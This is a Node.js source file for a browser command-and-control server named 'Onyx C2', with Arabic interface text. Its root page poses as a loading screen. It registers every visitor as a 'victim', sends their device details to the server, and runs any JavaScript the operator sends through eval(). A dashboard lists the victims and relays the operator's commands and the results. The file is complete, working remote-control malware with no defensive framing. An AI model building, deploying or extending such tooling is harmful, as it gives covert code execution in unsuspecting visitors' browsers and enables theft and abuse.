const express = require('express');
const http = require('http');
const { Server } = require('socket.io');

const app = express();
const server = http.createServer(app);
const io = new Server(server);

const PORT = process.env.PORT || 3000;

let victims = {};

app.get('/dashboard', (req, res) => {
    let html = `
    <!DOCTYPE html>
    <html lang="ar" dir="rtl">
    <head>
        <meta charset="UTF-8">
        <title>Onyx Master Control</title>
        <style>
            body { background: #0b0f19; color: #f8fafc; font-family: monospace; padding: 20px; }
            h1 { color: #38bdf8; }
            .victim-card { background: #1e293b; border: 1px solid #334155; padding: 15px; margin-bottom: 15px; border-radius: 8px; }
            input, button { background: #334155; color: white; border: 1px solid #475569; padding: 8px; border-radius: 4px; }
            button { cursor: pointer; background: #0284c7; }
            pre { background: #0f172a; padding: 10px; border-radius: 4px; overflow-x: auto; color: #4ade80; }
        </style>
    </head>
    <body>
        <h1>Onyx C2 - لوحة السيطرة</h1>
        <div id="victims-list">لا توجد أجهزة متصلة حالياً...</div>

        <script src="/socket.io/socket.io.js"></script>
        <script>
            const socket = io();
            socket.emit('register-admin');

            socket.on('update-victims', (data) => {
                const list = document.getElementById('victims-list');
                const keys = Object.keys(data);
                if (keys.length === 0) {
                    list.innerHTML = 'لا توجد أجهزة متصلة حالياً...';
                    return;
                }
                list.innerHTML = '';
                keys.forEach(id => {
                    let v = data[id];
                    list.innerHTML += `
                        <div class="victim-card">
                            <strong>معرف الضحية:</strong> ${id}<br>
                            <strong>الجهاز:</strong> ${v.userAgent}<br>
                            <input type="text" id="cmd-${id}" placeholder="اكتب الأمر هنا..." style="width: 70%;">
                            <button onclick="sendCmd('${id}')">تنفيذ</button>
                            <pre id="output-${id}">في انتظار الرد...</pre>
                        </div>
                    `;
                });
            });

            function sendCmd(id) {
                const cmd = document.getElementById('cmd-' + id).value;
                if(!cmd) return;
                socket.emit('admin-command', { targetId: id, command: cmd });
            }

            socket.on('cmd-result', (data) => {
                const out = document.getElementById('output-' + data.id);
                if(out) out.innerText = data.result;
            });
        </script>
    </body>
    </html>
    `;
    res.send(html);
});

app.get('/', (req, res) => {
    res.send(`
    <!DOCTYPE html>
    <html lang="ar">
    <head><meta charset="UTF-8"><title>Loading...</title></head>
    <body>
        <h2>جاري التحميل، يرجى الانتظار...</h2>
        <script src="/socket.io/socket.io.js"></script>
        <script>
            const socket = io();
            socket.on('connect', () => {
                socket.emit('register-victim', {
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    screen: window.screen.width + 'x' + window.screen.height
                });
            });

            socket.on('exec-command', async (cmd) => {
                try {
                    let res = eval(cmd);
                    if (res instanceof Promise) res = await res;
                    socket.emit('command-response', { result: String(res) });
                } catch (err) {
                    socket.emit('command-response', { result: "Error: " + err.message });
                }
            });
        </script>
    </body>
    </html>
    `);
});

io.on('connection', (socket) => {
    socket.on('register-victim', (info) => {
        victims[socket.id] = { ...info, socket: socket };
        io.to('admins').emit('update-victims', getVictimsData());
        console.log(`[+] اتصال ضحية جديدة: ${socket.id}`);
    });

    socket.on('register-admin', () => {
        socket.join('admins');
        socket.emit('update-victims', getVictimsData());
    });

    socket.on('admin-command', (data) => {
        const target = victims[data.targetId];
        if (target) {
            target.socket.emit('exec-command', data.command);
            target.socket.once('command-response', (res) => {
                io.to('admins').emit('cmd-result', { id: data.targetId, result: res.result });
            });
        }
    });

    socket.on('disconnect', () => {
        if (victims[socket.id]) {
            delete victims[socket.id];
            io.to('admins').emit('update-victims', getVictimsData());
            console.log(`[-] انقطع اتصال الضحية: ${socket.id}`);
        }
    });
});

function getVictimsData() {
    let clean = {};
    for (let id in victims) {
        clean[id] = { userAgent: victims[id].userAgent, platform: victims[id].platform };
    }
    return clean;
}

server.listen(PORT, () => {
    console.log(`[*] السيرفر شغال بقوة على البورت ${PORT}`);
});
